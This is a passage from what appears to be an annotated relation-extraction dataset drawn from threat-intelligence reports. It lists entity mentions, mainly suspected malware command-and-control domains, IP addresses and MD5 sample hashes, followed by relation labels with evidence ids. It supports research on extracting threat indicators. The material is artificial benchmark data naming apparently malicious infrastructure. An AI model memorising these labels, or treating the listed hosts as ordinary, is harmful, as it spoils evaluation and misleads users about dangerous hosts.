"pos": [8, 9], "sent_id": 680, "type": "Indicator"}], [{"name": "game.winniqi.com", "pos": [10, 11], "sent_id": 680, "type": "Indicator"}], [{"name": "configure.selfip.org", "pos": [11, 12], "sent_id": 680, "type": "Indicator"}], [{"name": "dnsabc.webhop.net", "pos": [13, 14], "sent_id": 680, "type": "Indicator"}], [{"name": "www.windowsliveupdatecache.com", "pos": [4, 5], "sent_id": 683, "type": "Indicator"}], [{"name": "www.windowsliveupdatecache.com", "pos": [4, 5], "sent_id": 683, "type": "Indicator"}], [{"name": "www.windowsliveupdatecache.com", "pos": [4, 5], "sent_id": 683, "type": "Indicator"}], [{"name": "qqpass.kittyeah.com", "pos": [0, 1], "sent_id": 684, "type": "Indicator"}], [{"name": "qqpass.kittyeah.com", "pos": [0, 1], "sent_id": 684, "type": "Indicator"}], [{"name": "qqpass.kittyeah.com", "pos": [0, 1], "sent_id": 684, "type": "Indicator"}], [{"name": "qqpass.kittyeah.com", "pos": [0, 1], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "www.windows-liveupdate.com", "pos": [3, 4], "sent_id": 684, "type": "Indicator"}], [{"name": "bbaolong.vicp.net", "pos": [4, 5], "sent_id": 684, "type": "Indicator"}], [{"name": "bbaolong.vicp.net", "pos": [4, 5], "sent_id": 684, "type": "Indicator"}], [{"name": "bbaolong.vicp.net", "pos": [4, 5], "sent_id": 684, "type": "Indicator"}], [{"name": "bbaolong.vicp.net", "pos": [4, 5], "sent_id": 684, "type": "Indicator"}], [{"name": "5bcf43e49d6bfbc26ec1f1cd6968ed3e", "pos": [59, 60], "sent_id": 740, "type": "MD5"}], [{"name": "5d2d6d9fe58355c01e31c0f12ab99bd3", "pos": [0, 1], "sent_id": 741, "type": "MD5"}], [{"name": "5db6e16c286363115454690bc5c3da77", "pos": [1, 2], "sent_id": 741, "type": "MD5"}], [{"name": "6648c9ffc4f4e705545daaa3c09373fd", "pos": [2, 3], "sent_id": 741, "type": "MD5"}], [{"name": "69238872045ab0148c581bb8d99a6a1c", "pos": [0, 1], "sent_id": 742, "type": "MD5"}], [{"name": "6a71157ee541a78f580f5eebc53b86eb", "pos": [1, 2], "sent_id": 742, "type": "MD5"}], [{"name": "6e7fc8bac73410b58d4d1b2ce0dcc44e", "pos": [0, 1], "sent_id": 743, "type": "MD5"}], [{"name": "7fc18dedcc7728b3103d4108557e8fb4", "pos": [0, 1], "sent_id": 744, "type": "MD5"}], [{"name": "8fff7ca54103d5de1734b940d165b871", "pos": [1, 2], "sent_id": 744, "type": "MD5"}], [{"name": "b443f9a521d7ea56b387d36484df1900", "pos": [2, 3], "sent_id": 744, "type": "MD5"}], [{"name": "b5ff5a76ab4cca4a8fc3d2c39b30c997", "pos": [3, 4], "sent_id": 744, "type": "MD5"}], [{"name": "b756fb047aff38fb8a2f2778d4b2d392", "pos": [4, 5], "sent_id": 744, "type": "MD5"}], [{"name": "cf8861ae0c0525d345a72ac43a767548", "pos": [1, 2], "sent_id": 745, "type": "MD5"}], [{"name": "d13e4ef3e3791927397baf292182c583", "pos": [0, 1], "sent_id": 746, "type": "MD5"}], [{"name": "e1fe9adfc62dfe5aee7d7cf3d6e51c29", "pos": [0, 1], "sent_id": 747, "type": "MD5"}], [{"name": "f52d6ba37ae65bd02ee5485309c87cdd", "pos": [1, 2], "sent_id": 747, "type": "MD5"}], [{"name": "f6edfa0c8d35f74374d62309a8436a46", "pos": [0, 1], "sent_id": 748, "type": "MD5"}], [{"name": "faffe9b9182709f62de4da91cffe3a5f", "pos": [1, 2], "sent_id": 748, "type": "MD5"}], [{"name": "e2a063d5afb6cf892431246013cc3919", "pos": [2, 3], "sent_id": 748, "type": "MD5"}], [{"name": "01c142c7bfb0d8655f02eaac5cbe0baf", "pos": [3, 4], "sent_id": 748, "type": "MD5"}], [{"name": "09cadcb2af2d06dae3a120ff43aa97ac", "pos": [0, 1], "sent_id": 749, "type": "MD5"}], [{"name": "1a0ab794b8b590964c9c2d024956ad01", "pos": [1, 2], "sent_id": 749, "type": "MD5"}], [{"name": "3d4545c40e4f359ad38dde0dae375f18", "pos": [0, 1], "sent_id": 750, "type": "MD5"}], [{"name": "52e8c0d7b2572054198b2d4dc401bc47", "pos": [1, 2], "sent_id": 750, "type": "MD5"}], [{"name": "538da437660a6a3ff64e9eba44d27423", "pos": [2, 3], "sent_id": 750, "type": "MD5"}], [{"name": "55f75ea088c723958bf880391747b7a3", "pos": [3, 4], "sent_id": 750, "type": "MD5"}], [{"name": "5de88d845578b8782a570c1f808a164c", "pos": [0, 1], "sent_id": 751, "type": "MD5"}], [{"name": "64cd92c40c4249dfc03aa9e211605f55", "pos": [1, 2], "sent_id": 751, "type": "MD5"}], [{"name": "68ac613a97afdd9a0c58c05908e15e82", "pos": [2, 3], "sent_id": 751, "type": "MD5"}], [{"name": "9335bbd44567f56d4f4027cf2d105156", "pos": [3, 4], "sent_id": 751, "type": "MD5"}], [{"name": "a085e20215ffed7056ddeb49b0fa8c8c", "pos": [4, 5], "sent_id": 751, "type": "MD5"}], [{"name": "a7756ffb6fafc866e9c6ba7a51f162e5", "pos": [5, 6], "sent_id": 751, "type": "MD5"}], [{"name": "a7a4fb56c8e7a74490e00146a14d641d", "pos": [6, 7], "sent_id": 751, "type": "MD5"}], [{"name": "be7ac4097e8740a280c2daabbc8aac2c", "pos": [7, 8], "sent_id": 751, "type": "MD5"}], [{"name": "cf3a539bd308964b357c6d7fdb8e77cd", "pos": [8, 9], "sent_id": 751, "type": "MD5"}], [{"name": "d745cd51b8497638a8bc7d65f6aea302", "pos": [0, 1], "sent_id": 752, "type": "MD5"}], [{"name": "da981c3c8acfdd7a4b1982ceb53d2105", "pos": [1, 2], "sent_id": 752, "type": "MD5"}], [{"name": "e2ccc17ad7428516b22d73d7f3d04c88", "pos": [2, 3], "sent_id": 752, "type": "MD5"}], [{"name": "eb99559000fa4bffb09f0095b5771f64", "pos": [3, 4], "sent_id": 752, "type": "MD5"}], [{"name": "f451140e7ad709b239bfe5b9a9e85ec7", "pos": [4, 5], "sent_id": 752, "type": "MD5"}], [{"name": "f7427898041410dec0d6ac1a2250838c", "pos": [0, 1], "sent_id": 753, "type": "MD5"}], [{"name": "14259ca243aa80e733bdd7d65e518c6d", "pos": [1, 2], "sent_id": 753, "type": "MD5"}], [{"name": "a27b30f1dedf64900eac64fdb22d51c9", "pos": [0, 1], "sent_id": 754, "type": "MD5"}], [{"name": "2fd59b0af3858688487aa5d98f5927d1", "pos": [1, 2], "sent_id": 754, "type": "MD5"}], [{"name": "31890debe88cd057c351a64e260682f8", "pos": [2, 3], "sent_id": 754, "type": "MD5"}], [{"name": "3ec57887caa14d1c7b83a0f7a441b52a", "pos": [0, 1], "sent_id": 755, "type": "MD5"}], [{"name": "41d985d0b3a9dfd79da0b39f9a1aa4bf", "pos": [1, 2], "sent_id": 755, "type": "MD5"}], [{"name": "46ebbc42670e8e2a0a03654559d54983", "pos": [2, 3], "sent_id": 755, "type": "MD5"}], [{"name": "60064d648bc533a38a708dbe5f759034", "pos": [3, 4], "sent_id": 755, "type": "MD5"}], [{"name": "60111cd0e8372f84df471e71ef9909a7", "pos": [0, 1], "sent_id": 756, "type": "MD5"}], [{"name": "64bc0eee75c62da0e997ca3f4e257cdb", "pos": [1, 2], "sent_id": 756, "type": "MD5"}], [{"name": "827604d4811d2dfbf34e7de87a48a08e", "pos": [2, 3], "sent_id": 756, "type": "MD5"}], [{"name": "8423599f6ffd07d5bc9cc02b3610b0f8", "pos": [3, 4], "sent_id": 756, "type": "MD5"}], [{"name": "86142a2eddfadb5d3d879e8a377bec7d", "pos": [4, 5], "sent_id": 756, "type": "MD5"}], [{"name": "8891b5aa1125c2b9b4e06158346b1f21", "pos": [5, 6], "sent_id": 756, "type": "MD5"}], [{"name": "936721205de8e825b02099f036ad1b61", "pos": [6, 7], "sent_id": 756, "type": "MD5"}], [{"name": "96f19f590ebc84ded2a7af4c052fccf2", "pos": [7, 8], "sent_id": 756, "type": "MD5"}], [{"name": "zfyxu.gicp.net", "pos": [27, 28], "sent_id": 756, "type": "Indicator"}], [{"name": "zfyxu.gicp.net", "pos": [27, 28], "sent_id": 756, "type": "Indicator"}], [{"name": "olk4.3322.org", "pos": [0, 1], "sent_id": 757, "type": "Indicator"}], [{"name": "olk4.3322.org", "pos": [0, 1], "sent_id": 757, "type": "Indicator"}], [{"name": "dog.aumoni.com", "pos": [3, 4], "sent_id": 757, "type": "Indicator"}], [{"name": "tigertigertiger.3322.org", "pos": [5, 6], "sent_id": 757, "type": "Indicator"}], [{"name": "tigertigertiger.3322.org", "pos": [5, 6], "sent_id": 757, "type": "Indicator"}], [{"name": "tigertigertiger", "pos": [5, 6], "sent_id": 757, "type": "Indicator"}], [{"name": "tigertigertiger.3322.org", "pos": [5, 6], "sent_id": 757, "type": "Indicator"}], [{"name": "liyanyanzy.3322.org", "pos": [8, 9], "sent_id": 757, "type": "Indicator"}], [{"name": "liyanyanzy.3322.org", "pos": [8, 9], "sent_id": 757, "type": "Indicator"}], [{"name": "liyanyanzy.3322.org", "pos": [8, 9], "sent_id": 757, "type": "Indicator"}], [{"name": "liyanyanzy.3322.org", "pos": [8, 9], "sent_id": 757, "type": "Indicator"}], [{"name": "tb801.co.cc", "pos": [0, 1], "sent_id": 758, "type": "Indicator"}], [{"name": "liyanyanzy.tk", "pos": [4, 5], "sent_id": 758, "type": "Indicator"}], [{"name": "liyanyanzy.tk", "pos": [4, 5], "sent_id": 758, "type": "Indicator"}], [{"name": "sunnyrone.coyo.eu", "pos": [6, 7], "sent_id": 758, "type": "Indicator"}], [{"name": "sunnyrone.coyo.eu", "pos": [6, 7], "sent_id": 758, "type": "Indicator"}], [{"name": "tb-20110112.3322.org", "pos": [8, 9], "sent_id": 758, "type": "Indicator"}], [{"name": "tb-20110112.3322.org", "pos": [8, 9], "sent_id": 758, "type": "Indicator"}], [{"name": "yangjinxiu.vicp.net", "pos": [9, 10], "sent_id": 758, "type": "Indicator"}], [{"name": "yangjinxiu.vicp.net", "pos": [9, 10], "sent_id": 758, "type": "Indicator"}], [{"name": "veidu.uicp.net", "pos": [11, 12], "sent_id": 758, "type": "Indicator"}], [{"name": "veidu.uicp.net", "pos": [11, 12], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "xyxf110.3322.org", "pos": [12, 13], "sent_id": 758, "type": "Indicator"}], [{"name": "csfox.3322.org", "pos": [13, 14], "sent_id": 758, "type": "Indicator"}], [{"name": "csfox.3322.org", "pos": [13, 14], "sent_id": 758, "type": "Indicator"}], [{"name": "csfox.3322.org", "pos": [13, 14], "sent_id": 758, "type": "Indicator"}], [{"name": "csfox.3322.org", "pos": [13, 14], "sent_id": 758, "type": "Indicator"}], [{"name": "csfox.3322.org", "pos": [13, 14], "sent_id": 758, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "jiangshan2368131.3322.org", "pos": [0, 1], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "bafeite518.vicp.net", "pos": [4, 5], "sent_id": 759, "type": "Indicator"}], [{"name": "www.zone.qpoe.com", "pos": [5, 6], "sent_id": 759, "type": "Indicator"}], [{"name": "www.zone.qpoe.com", "pos": [5, 6], "sent_id": 759, "type": "Indicator"}], [{"name": "terry0707.vicp.cc", "pos": [6, 7], "sent_id": 759, "type": "Indicator"}], [{"name": "terry0707.vicp.cc", "pos": [6, 7], "sent_id": 759, "type": "Indicator"}], [{"name": "terry0707.vicp.cc", "pos": [6, 7], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "axna.5166.info", "pos": [8, 9], "sent_id": 759, "type": "Indicator"}], [{"name": "97cba74ed66a650403c16c6aca96d608", "pos": [0, 1], "sent_id": 787, "type": "MD5"}], [{"name": "9e890216c8c880c5c4859a77894c8210", "pos": [0, 1], "sent_id": 788, "type": "MD5"}], [{"name": "b13352f5a17d3eb3937ea9cbbdd142cf", "pos": [0, 1], "sent_id": 789, "type": "MD5"}], [{"name": "b5ba974dadb886bcdd826a3692915d3a", "pos": [1, 2], "sent_id": 789, "type": "MD5"}], [{"name": "bf973493fd8d7c097d26ecc1c1a75b96", "pos": [2, 3], "sent_id": 789, "type": "MD5"}], [{"name": "c364c68e36f7d864dc78a1778eb0b262", "pos": [3, 4], "sent_id": 789, "type": "MD5"}], [{"name": "d0f62109a38e0dbafcc1a3fefecfd09c", "pos": [4, 5], "sent_id": 789, "type": "MD5"}], [{"name": "df5be665924cfd5898c189c91a79322f", "pos": [0, 1], "sent_id": 790, "type": "MD5"}], [{"name": "f07b20c47dee2362ea66b57a96acc7ed", "pos": [1, 2], "sent_id": 790, "type": "MD5"}], [{"name": "e3ef377d4ed4b8c0fca7b893f4074ce0", "pos": [1, 2], "sent_id": 792, "type": "MD5"}], [{"name": "04ce6965a52bb87cc070077678f5e323", "pos": [2, 3], "sent_id": 792, "type": "MD5"}], [{"name": "081e01fecdd47346a55e5a8a13b0720c", "pos": [3, 4], "sent_id": 792, "type": "MD5"}], [{"name": "0bdacf6e88263c85a669b84692a337b1", "pos": [4, 5], "sent_id": 792, "type": "MD5"}], [{"name": "b030c0d878997350a7dd1f0533090846", "pos": [0, 1], "sent_id": 793, "type": "MD5"}], [{"name": "e95432553f5d6ddaadad8a634a9a3e7d", "pos": [1, 2], "sent_id": 793, "type": "MD5"}], [{"name": "ef1de280764dfa67abdfe3928932a6a2", "pos": [2, 3], "sent_id": 793, "type": "MD5"}], [{"name": "da52a58fa6f45fd8ede22a0618cb7260", "pos": [0, 1], "sent_id": 794, "type": "MD5"}], [{"name": "103b21042f60d6904a819d504a7b1be1", "pos": [0, 1], "sent_id": 795, "type": "MD5"}], [{"name": "10cfadfb49b1ca15563b20e72ffde76f", "pos": [1, 2], "sent_id": 795, "type": "MD5"}], [{"name": "772447c014c0ef465313fb8865d3c501", "pos": [2, 3], "sent_id": 795, "type": "MD5"}], [{"name": "882b1e94652a6ee0377380d2b7c74de5", "pos": [1, 2], "sent_id": 796, "type": "MD5"}], [{"name": "1ce83eb64757f30737aebfc177ff681b", "pos": [2, 3], "sent_id": 796, "type": "MD5"}], [{"name": "429bc1afd27b39a26494c868a4013eaa", "pos": [0, 1], "sent_id": 797, "type": "MD5"}], [{"name": "8a3ca42ee9b67c4d030ee9d5193fd8b8", "pos": [1, 2], "sent_id": 798, "type": "MD5"}], [{"name": "8ae26d583509b9eea207126b29121459", "pos": [0, 1], "sent_id": 799, "type": "MD5"}], [{"name": "fda1664e10e36c833a1aceae3688fc73", "pos": [1, 2], "sent_id": 799, "type": "MD5"}], [{"name": "04045fd7863c2512da99d69bbe7ceb43", "pos": [0, 1], "sent_id": 800, "type": "MD5"}], [{"name": "09a291e91adc6a994499fb27e7fae65c", "pos": [0, 1], "sent_id": 801, "type": "MD5"}], [{"name": "1a087cdeac6ee8169fa9f0359403091b", "pos": [0, 1], "sent_id": 802, "type": "MD5"}], [{"name": "1f3065accfe697c56f45b641659f6418", "pos": [1, 2], "sent_id": 802, "type": "MD5"}], [{"name": "3e7ba528aa87d0ec6a24c643e5527391", "pos": [2, 3], "sent_id": 802, "type": "MD5"}], [{"name": "4b386d215a650280b685837e3a11b126", "pos": [3, 4], "sent_id": 802, "type": "MD5"}], [{"name": "51c318d9f127a1f2fc112e22105cb5fb", "pos": [0, 1], "sent_id": 803, "type": "MD5"}], [{"name": "6abf57bc4621a8f5e3153cb3c10353a2", "pos": [0, 1], "sent_id": 804, "type": "MD5"}], [{"name": "84ae8974750c2993aa409e048c940c69", "pos": [0, 1], "sent_id": 805, "type": "MD5"}], [{"name": "9f33a565837211d126ef48a518b14971", "pos": [1, 2], "sent_id": 805, "type": "MD5"}], [{"name": "a07f6cf0029adbf16e8b7c644c26ce81", "pos": [2, 3], "sent_id": 805, "type": "MD5"}], [{"name": "aa056a0ac5d81d0fb7974702861ea827", "pos": [0, 1], "sent_id": 806, "type": "MD5"}], [{"name": "b38b53f6a04c2f42433bef80df18998a", "pos": [0, 1], "sent_id": 807, "type": "MD5"}], [{"name": "b65f394d07a665dadab98b3fdcfec25f", "pos": [1, 2], "sent_id": 807, "type": "MD5"}], [{"name": "e866043cf627b6ef4d13a820e314a99c", "pos": [2, 3], "sent_id": 807, "type": "MD5"}], [{"name": "fe4df2b266a570fc041a1a1cdd5451f2", "pos": [3, 4], "sent_id": 807, "type": "MD5"}], [{"name": "0ca360ef2797bee54b53e5a34d47f3e4", "pos": [4, 5], "sent_id": 807, "type": "MD5"}], [{"name": "8f0b13f9111241132e1c0738f5b03227", "pos": [0, 1], "sent_id": 808, "type": "MD5"}], [{"name": "6d869c47d1930ea7fc054f22d49402ff", "pos": [1, 2], "sent_id": 808, "type": "MD5"}], [{"name": "044d8a1f538cc875c4222272984a6193", "pos": [2, 3], "sent_id": 808, "type": "MD5"}], [{"name": "0eb634f8e1ce366b8b7216024590df2b", "pos": [3, 4], "sent_id": 808, "type": "MD5"}], [{"name": "20aa76dcd2bb2925d8d5fda4a39f5947", "pos": [0, 1], "sent_id": 809, "type": "MD5"}], [{"name": "2e81515f8323a4481e1bdcc4e5193d99", "pos": [0, 1], "sent_id": 810, "type": "MD5"}], [{"name": "35c355c051d911d34bf9fae984973fb9", "pos": [0, 1], "sent_id": 811, "type": "MD5"}], [{"name": "48a8e6dc1e9b11a0c2aecf6fcd1d8d03", "pos": [1, 2], "sent_id": 811, "type": "MD5"}], [{"name": "4dd04d65e16f6147a8427f548fd1f9a3", "pos": [2, 3], "sent_id": 811, "type": "MD5"}], [{"name": "55b2c4e0d2d036910a014167dab5c8f9", "pos": [3, 4], "sent_id": 811, "type": "MD5"}], [{"name": "atneh.vicp.net", "pos": [10, 11], "sent_id": 811, "type": "Indicator"}], [{"name": "www.mol-government.com", "pos": [13, 14], "sent_id": 811, "type": "Indicator"}], [{"name": "www.newsyandex.com", "pos": [0, 1], "sent_id": 812, "type": "Indicator"}], [{"name": "long1235.3322.org", "pos": [2, 3], "sent_id": 813, "type": "Indicator"}], [{"name": "long1235.3322.org", "pos": [2, 3], "sent_id": 813, "type": "Indicator"}], [{"name": "long1235.3322.org", "pos": [2, 3], "sent_id": 813, "type": "Indicator"}], [{"name": "long1235.3322.org", "pos": [2, 3], "sent_id": 813, "type": "Indicator"}], [{"name": "long1235.3322.org", "pos": [2, 3], "sent_id": 813, "type": "Indicator"}], [{"name": "monalisa88188.3322.org", "pos": [7, 8], "sent_id": 813, "type": "Indicator"}], [{"name": "monalisa88188.3322.org", "pos": [7, 8], "sent_id": 813, "type": "Indicator"}], [{"name": "asion-2009.gicp.net", "pos": [9, 10], "sent_id": 813, "type": "Indicator"}], [{"name": "asion-2009.gicp.net", "pos": [9, 10], "sent_id": 813, "type": "Indicator"}], [{"name": "asion-2009.gicp.net", "pos": [9, 10], "sent_id": 813, "type": "Indicator"}], [{"name": "asion-2009.gicp.net", "pos": [9, 10], "sent_id": 813, "type": "Indicator"}], [{"name": "asion-2009.gicp.net", "pos": [9, 10], "sent_id": 813, "type": "Indicator"}], [{"name": "iamflying.3322.org", "pos": [13, 14], "sent_id": 813, "type": "Indicator"}], [{"name": "xxxxxxxxxx", "pos": [17, 18], "sent_id": 813, "type": "Indicator"}], [{"name": "59.50.99.83", "pos": [0, 1], "sent_id": 814, "type": "Indicator"}], [{"name": "59.50.99.83", "pos": [0, 1], "sent_id": 814, "type": "Indicator"}], [{"name": "csfox.3322.oRg", "pos": [0, 1], "sent_id": 815, "type": "Indicator"}], [{"name": "csfox.3322.oRg", "pos": [0, 1], "sent_id": 815, "type": "Indicator"}], [{"name": "CsFoX.3322.OrG", "pos": [2, 3], "sent_id": 816, "type": "Indicator"}], [{"name": "CsFoX.3322.OrG", "pos": [2, 3], "sent_id": 816, "type": "Indicator"}], [{"name": "CsFoX.3322.OrG", "pos": [2, 3], "sent_id": 816, "type": "Indicator"}], [{"name": "csFOX.3322.orG", "pos": [7, 8], "sent_id": 817, "type": "Indicator"}], [{"name": "csFOX.3322.orG", "pos": [7, 8], "sent_id": 817, "type": "Indicator"}], [{"name": "CSfox.3322.Org", "pos": [1, 2], "sent_id": 901, "type": "Indicator"}], [{"name": "paladin666.gicp.net", "pos": [1, 2], "sent_id": 902, "type": "Indicator"}], [{"name": "paladin666.gicp.net", "pos": [1, 2], "sent_id": 902, "type": "Indicator"}], [{"name": "paladin666.gicp.net", "pos": [1, 2], "sent_id": 902, "type": "Indicator"}], [{"name": "paladin666.gicp.net", "pos": [1, 2], "sent_id": 902, "type": "Indicator"}], [{"name": "sbwfn007.3322.org", "pos": [5, 6], "sent_id": 902, "type": "Indicator"}], [{"name": "sbwfn007.3322.org", "pos": [5, 6], "sent_id": 902, "type": "Indicator"}], [{"name": "sbwfn007.3322.org", "pos": [5, 6], "sent_id": 902, "type": "Indicator"}], [{"name": "sbwfn007.3322.org", "pos": [5, 6], "sent_id": 902, "type": "Indicator"}], [{"name": "freedom8964.ddns.info", "pos": [7, 8], "sent_id": 902, "type": "Indicator"}], [{"name": "heiantiankong.gicp.net", "pos": [10, 11], "sent_id": 902, "type": "Indicator"}], [{"name": "123.151.192.105", "pos": [0, 1], "sent_id": 904, "type": "Indicator"}], [{"name": "hh-mr.gicp.net", "pos": [1, 2], "sent_id": 905, "type": "Indicator"}], [{"name": "fun010.vicp.net", "pos": [3, 4], "sent_id": 905, "type": "Indicator"}], [{"name": "fun010.vicp.net", "pos": [3, 4], "sent_id": 905, "type": "Indicator"}], [{"name": "iamflying.vicp.net", "pos": [5, 6], "sent_id": 905, "type": "Indicator"}], [{"name": "hqhaha.hk221.hqidc.net", "pos": [16, 17], "sent_id": 905, "type": "Indicator"}], [{"name": "hqhaha.hk221.hqidc.net", "pos": [16, 17], "sent_id": 905, "type": "Indicator"}], [{"name": "hqhaha.hk221.hqidc.net", "pos": [16, 17], "sent_id": 905, "type": "Indicator"}], [{"name": "xiaoya.oicp.net", "pos": [2, 3], "sent_id": 908, "type": "Indicator"}], [{"name": "zooosi.com", "pos": [0, 1], "sent_id": 909, "type": "Indicator"}]], "labels": [{"r": "P21", "h": 26, "t": 25, "evidence": [28, 30]}, {"r": "P21", "h": 27, "t": 25, "evidence": [28, 30]}, {"r": "P21", "h": 28, "t": 29, "evidence": [34]}, {"r": "P21", "h": 30, "t": 29, "evidence": [34]}, {"r": "P21", "h": 31, "t": 29, "evidence": [34]}, {"r": "P21", "h": 33, "t": 32, "evidence": [39, 40]}, {"r": "P21", "h": 38, "t": 32, "evidence": [39, 41]}, {"r": "P21", "h": 37, "t": 32, "evidence": [39, 41]}, {"r": "P21", "h": 43, "t": 32, "evidence": [39, 42]}, {"r": "P21", "h": 50, "t": 48, "evidence": [61, 62]}, {"r": "P13", "h": 48, "t": 49, "evidence": [61, 62]}, {"r": "P21", "h": 51, "t": 48, "evidence": [61, 62]}, {"r": "P21", "h": 52, "t": 48, "evidence": [61, 62]}, {"r": "P21", "h": 54, "t": 53, "evidence": [63]}, {"r": "P21", "h": 55, "t": 53, "evidence": [63]}, {"r": "P21", "h": 60, "t": 59, "evidence": [72]}, {"r": "P21", "h": 61, "t": 59, "evidence": [72, 73]}, {"r": "P21", "h": 63, "t": 59, "evidence": [72, 74]}, {"r": "P21", "h": 65, "t": 64, "evidence": [76]}, {"r": "P21", "h": 66, "t": 64, "evidence": [76]}, {"r": "P21", "h": 67, "t": 64, "evidence": [76, 77]}, {"r": "P7", "h": 64, "t": 68, "evidence": [76, 77]}, {"r": "P21", "h": 69, "t": 64, "evidence": [76, 77]}, {"r": "P21", "h": 71, "t": 70, "evidence": [80, 81]}, {"r": "P21", "h": 75, "t": 70, "evidence": [80, 83]}, {"r": "P21", "h": 77, "t": 70, "evidence": [80, 83]}, {"r": "P21", "h": 79, "t": 70, "evidence": [80, 83]}, {"r": "P21", "h": 92, "t": 93, "evidence": [89, 90]}, {"r": "P21", "h": 90, "t": 93, "evidence": [89, 90]}, {"r": "P21", "h": 82, "t": 93, "evidence": [84, 90]}, {"r": "P21", "h": 83, "t": 93, "evidence": [86, 90]}, {"r": "P21", "h": 88, "t": 93, "evidence": [88, 90]}, {"r": "P21", "h": 94, "t": 93, "evidence": [90]}, {"r": "P21", "h": 95, "t": 93, "evidence": [90]}, {"r": "P21", "h": 92, "t": 96, "evidence": [89, 91]}, {"r": "P21", "h": 92, "t": 97, "evidence": [89, 91]}, {"r": "P21", "h": 98, "t": 93, "evidence": [90, 92]}, {"r": "P21", "h": 100, "t": 93, "evidence": [90, 92]}, {"r": "P21", "h": 104, "t": 93, "evidence": [90, 92]}, {"r": "P21", "h": 102, "t": 93, "evidence": [90, 92]}, {"r": "P21", "h": 106, "t": 93, "evidence": [90, 92]}, {"r": "P21", "h": 110, "t": 109, "evidence": [94]}, {"r": "P21", "h": 111, "t": 109, "evidence": [94]}, {"r": "P21", "h": 108, "t": 109, "evidence": [93, 94]}, {"r": "P21", "h": 112, "t": 109, "evidence": [94, 95]}, {"r": "P21", "h": 114, "t": 109, "evidence": [94, 95]}, {"r": "P21", "h": 115, "t": 109, "evidence": [94, 96]}, {"r": "P21", "h": 116, "t": 109, "evidence": [94, 96]}, {"r": "P21", "h": 117, "t": 109, "evidence": [94, 97]}, {"r": "P21", "h": 118, "t": 109, "evidence": [94, 97]}, {"r": "P21", "h": 120, "t": 109, "evidence": [94, 97]}, {"r": "P21", "h": 121, "t": 109, "evidence": [94, 97]}, {"r": "P21", "h": 122, "t": 124, "evidence": [99]}, {"r": "P21", "h": 122, "t": 123, "evidence": [99]}, {"r": "P21", "h": 131, "t": 140, "evidence": [105]}, {"r": "P21", "h": 133, "t": 141, "evidence": [105]}, {"r": 